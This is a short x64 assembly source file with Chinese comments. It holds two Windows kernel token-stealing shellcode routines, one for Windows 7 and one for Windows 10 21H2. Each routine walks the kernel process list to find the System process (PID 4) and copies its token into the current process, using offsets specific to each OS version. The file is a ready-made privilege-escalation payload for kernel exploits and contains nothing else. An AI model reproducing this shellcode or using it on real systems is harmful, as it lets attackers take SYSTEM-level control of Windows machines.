.code

ShellCodeInWin7 proc
	push r8
	push r9
	; 从KPCR中获取当前线程_ETHREAD
	mov rax, gs:[188h]
	; 从_ETHREAD中获取当前进程_EPROCESS
	mov rax, [rax+070h]	
	mov r8, rax
	
find_system_proc:
	; 获取下一进程EPROCESS地址
	mov rax, [rax+188h]	
	sub rax, 188h
	; 获取PID
	mov rdx, [rax+180h]	
	; 判断pid是否为4，不为4则跳转
	cmp rdx, 4			
	jne find_system_proc	

	; 将system的token赋值给本进程,并增加引用计数
	mov rax, [rax+208h]	
	and al, 0f0h
	mov [r8+208h], rax
	mov r9, 2
	add [rax-30h], r9
	
	; 设置返回值，退出函数
	mov rax, 1
	pop r9
	pop r8
	ret 
ShellCodeInWin7 endp

ShellCodeInWin10_21H2 proc
	push r8
	push r9
	; 从KRCRP中获取当前线程_ETHREAD
	mov rax, gs:[188h]
	; 从_ETHREAD中获取当前进程的_EPROCESS
	mov rax, [rax + 0B8h]
	mov r8, rax

find_system_proc:
	; 获取下一进程的EPROCESS
	mov rax, [rax + 448h]
	sub rax, 448h
	; 获取PID
	mov rdx, [rax + 440h]
	; 判断PID是否为4，不为4则跳转
	cmp rdx, 4
	jne find_system_proc

	; 将system进程的token赋给本进程，并增加引用计数
	mov rax, [rax + 4B8h]
	and al, 0F0h
	mov [r8 + 4B8h], rax
	mov r9, 2
	add [rax - 30h], r9
	
	; 设置返回值，退出函数
	mov rax, 1
	pop r9
	pop r8
	ret
ShellCodeInWin10_21H2 endp

end